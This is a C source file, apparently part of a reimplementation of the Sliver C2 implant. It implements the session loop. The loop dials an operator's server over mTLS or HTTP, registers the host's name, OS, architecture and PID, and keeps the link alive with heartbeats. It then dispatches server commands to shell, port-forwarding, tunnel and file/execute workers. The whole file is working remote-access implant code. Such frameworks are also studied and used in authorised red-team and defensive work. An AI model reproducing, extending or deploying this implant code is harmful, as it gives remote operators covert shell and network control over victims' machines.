/* src/modes/session.c - interactive session scheduler.
 *
 * Owns the session lifecycle only: register, accept-driven request/response and
 * teardown. The wire pipeline (TLS, MUX/1, yamux, signed frames) lives behind
 * sliver/channel.h so a second scheduler (beacon) and additional transports can
 * reuse it unchanged.
 */
#include "sliver/session.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/channel.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/rpc.h"

#define SLIVER_HEARTBEAT_INTERVAL_MS 120000u
#define SLIVER_HEARTBEAT_TICK_MS 200u

typedef struct {
  sliver_channel_t *ch;
  sliver_mutex_t *tx_lock;
  volatile int stop;
  volatile int closed;
} session_tx_t;

/* Sends one already-built envelope through the channel. Serialised per session
 * and refuses to touch the channel once teardown started. */
static int send_envelope(session_tx_t *tx, const void *envelope, size_t len) {
  int rc;

  if (tx->tx_lock != NULL) {
    sliver_mutex_lock(tx->tx_lock);
  }
  if (tx->closed || tx->ch == NULL) {
    if (tx->tx_lock != NULL) {
      sliver_mutex_unlock(tx->tx_lock);
    }
    return -1;
  }
  rc = tx->ch->send(tx->ch, envelope, len);
  if (tx->tx_lock != NULL) {
    sliver_mutex_unlock(tx->tx_lock);
  }
  return rc;
}

/* Envelope{ID, UnknownMessageType = true}. */
static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
  sliver_buf_init(out);
  if (sliver_buf_put_int64(out, 1, id) != 0) {
    return -1;
  }
  return sliver_buf_put_bool(out, 4, 1);
}

/* Lets the shell and portfwd modules push frames through the same sender. */
static session_tx_t *g_tx = NULL;

static int rpc_send_adapter(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
  sliver_buf_t env;
  int rc;

  if (g_tx == NULL) {
    return -1;
  }
  sliver_buf_init(&env);
  if (sliver_envelope_encode(&env, envelope_id, type, data, len) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  rc = send_envelope(g_tx, env.data, env.len);
  sliver_buf_free(&env);
  return rc;
}

static int shell_send_adapter(uint32_t type, const void *data, size_t len) {
  sliver_buf_t env;
  int rc;

  if (g_tx == NULL) {
    return -1;
  }
  sliver_buf_init(&env);
  if (sliver_envelope_encode(&env, 0, type, data, len) != 0) {
    sliver_buf_free(&env);
    return -1;
  }
  rc = send_envelope(g_tx, env.data, env.len);
  sliver_buf_free(&env);
  return rc;
}

/* Heartbeat: keeps NAT bindings alive and lets the server notice a dead peer. */
static void heartbeat_thread(void *arg) {
  session_tx_t *tx = (session_tx_t *)arg;
  uint32_t waited = 0;

  while (!tx->stop) {
    sliver_sleep_ms(SLIVER_HEARTBEAT_TICK_MS);
    if (tx->stop) {
      break;
    }
    waited += SLIVER_HEARTBEAT_TICK_MS;
    if (waited < SLIVER_HEARTBEAT_INTERVAL_MS) {
      continue;
    }
    waited = 0;
    {
      sliver_buf_t ping;
      sliver_buf_t env;
      sliver_buf_init(&ping);
      sliver_buf_init(&env);
      if (sliver_ping_encode(&ping, 31337) == 0 &&
          sliver_envelope_encode(&env, 0, SLIVER_MSG_PING, ping.data, ping.len) == 0) {
        if (send_envelope(tx, env.data, env.len) != 0) {
          LOG_WARN("session: heartbeat send failed");
        } else {
          LOG_DEBUG("session: heartbeat ping sent");
        }
      }
      sliver_buf_free(&ping);
      sliver_buf_free(&env);
    }
  }
}

int sliver_session_run(const sliver_session_config_t *cfg) {
  sliver_channel_t *ch = NULL;
  sliver_buf_t reg_buf, env_buf;
  sliver_register_t reg;
  /* Static: detached workers may hold a stale &tx past this function's return,
   * so the sender object must outlive the session frame (see teardown). */
  static session_tx_t tx;
  static sliver_mutex_t *tx_lock = NULL;
  sliver_thread_t *heartbeat = NULL;
  char err[256];
  int rc = -1;

  /* Only the signing material is universal: an http(s):// build carries no mTLS
   * certificates, so requiring them here silently aborted every HTTP session. */
  if (cfg == NULL || cfg->host == NULL || cfg->age_private_key == NULL ||
      cfg->server_minisign_pubkey == NULL) {
    LOG_ERROR("session: incomplete configuration (host/signing material missing)");
    return -1;
  }
  if (cfg->url != NULL && strncmp(cfg->url, "mtls://", 7) == 0 &&
      (cfg->ca_pem == NULL || cfg->cert_pem == NULL || cfg->key_pem == NULL)) {
    LOG_ERROR("session: mTLS material missing for mtls:// endpoint");
    return -1;
  }

  sliver_buf_init(&reg_buf);
  sliver_buf_init(&env_buf);

  err[0] = '\0';
  if (sliver_channel_dial(cfg->url, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
                          cfg->age_private_key, cfg->server_minisign_pubkey, &ch, err,
                          sizeof(err)) != 0) {
    LOG_ERROR("session: %s", err);
    return -1;
  }
  LOG_INFO("session: handshake ok (%s)", ch->describe(ch));

  if (tx_lock == NULL) {
    tx_lock = sliver_mutex_create();
  }
  tx.ch = ch;
  tx.tx_lock = tx_lock;
  tx.stop = 0;
  tx.closed = 0;
  g_tx = &tx;
  sliver_shell_set_sender(shell_send_adapter);
  sliver_portfwd_set_sender(shell_send_adapter);
  sliver_rpc_set_sender(rpc_send_adapter);
  /* A session has a live duplex link, so shell/tunnels/port forwarding work. */
  sliver_rpc_set_capabilities(SLIVER_CAP_TUNNEL);

  /* Register: Envelope{Type = MsgRegister, Data = Register}. */
  reg = cfg->reg;
  (void)snprintf(reg.active_c2, sizeof(reg.active_c2), "mtls://%s:%u", cfg->host,
                 (unsigned)cfg->port);
  if (sliver_register_encode(&reg_buf, &reg) != 0 ||
      sliver_envelope_encode(&env_buf, 0, SLIVER_MSG_REGISTER, reg_buf.data,
                             reg_buf.len) != 0) {
    LOG_ERROR("session: cannot encode register");
    goto out;
  }
  if (send_envelope(&tx, env_buf.data, env_buf.len) != 0) {
    LOG_ERROR("session: register send failed");
    goto out;
  }
  sliver_buf_free(&env_buf);
  sliver_buf_init(&env_buf);
  LOG_INFO("session: registered as %s (%s/%s, pid %d)", reg.name, reg.os, reg.arch,
           reg.pid);

  heartbeat = sliver_thread_create(heartbeat_thread, &tx);

  /* Serve server initiated streams until the connection dies. */
  for (;;) {
    sliver_envelope_t envelope;
    sliver_rpc_result_t result = {0};
    int r;

    r = ch->recv(ch, &env_buf);
    if (r == 1) {
      /* Not a clean end: the caller must reconnect (the Go implant retries). */
      LOG_INFO("session: connection closed");
      rc = -1;
      break;
    }
    if (r < 0) {
      sliver_buf_free(&env_buf);
      sliver_buf_init(&env_buf);
      continue;
    }
    if (sliver_envelope_decode(env_buf.data, env_buf.len, &envelope) != 0) {
      LOG_WARN("session: bad envelope");
      sliver_buf_free(&env_buf);
      sliver_buf_init(&env_buf);
      continue;
    }

    if (envelope.type == SLIVER_MSG_PING) {
      int32_t nonce = 0;
      (void)sliver_ping_decode_nonce(envelope.data, envelope.data_len, &nonce);
      LOG_DEBUG("session: ping from server (nonce %d)", nonce);
    } else {
      sliver_rpc_dispatch(&envelope, &result);
      if (result.no_response) {
        sliver_rpc_result_free(&result);
      } else if (result.handled) {
        sliver_buf_t reply;
        sliver_buf_init(&reply);
        if (sliver_envelope_encode(&reply, envelope.id, result.resp_type,
                                   result.message.data, result.message.len) == 0 &&
            send_envelope(&tx, reply.data, reply.len) == 0) {
          LOG_DEBUG("session: handled type %u -> %u (%u bytes)", envelope.type,
                    result.resp_type, (unsigned)result.message.len);
        } else {
          LOG_WARN("session: response send failed for type %u", envelope.type);
        }
        sliver_buf_free(&reply);
        sliver_rpc_result_free(&result);
      } else {
        sliver_buf_t reply;
        LOG_INFO("session: unsupported message type %u, sending UnknownMessageType",
                 envelope.type);
        if (encode_unknown_reply(&reply, envelope.id) == 0) {
          if (send_envelope(&tx, reply.data, reply.len) != 0) {
            LOG_ERROR("session: unknown-type reply send failed");
          } else {
            LOG_DEBUG("session: unknown-type reply sent (%u bytes)", (unsigned)reply.len);
          }
          sliver_buf_free(&reply);
        }
      }
    }
    sliver_buf_free(&env_buf);
    sliver_buf_init(&env_buf);
  }

out:
  tx.stop = 1;
  sliver_shell_shutdown();
  sliver_portfwd_shutdown();
  /* Mark the sender closed under the lock so any in-flight send_envelope
   * finishes first, then drop the channel reference it would otherwise touch
   * after the channel is freed below. */
  if (tx.tx_lock != NULL) {
    sliver_mutex_lock(tx.tx_lock);
    tx.closed = 1;
    tx.ch = NULL;
    g_tx = NULL;
    sliver_mutex_unlock(tx.tx_lock);
  } else {
    g_tx = NULL;
  }
  if (heartbeat != NULL) {
    (void)sliver_thread_join(heartbeat);
    heartbeat = NULL;
  }
  /* Do NOT destroy tx_lock here: detached workers (shell reader, portfwd relay,
   * execute/file workers) may still be in send_envelope() holding a reference to
   * the session tx/tx_lock. One leaked mutex per process is the safe trade. */
  sliver_buf_free(&reg_buf);
  sliver_buf_free(&env_buf);
  if (ch != NULL) {
    sliver_channel_free(ch);
  }
  return rc;
}
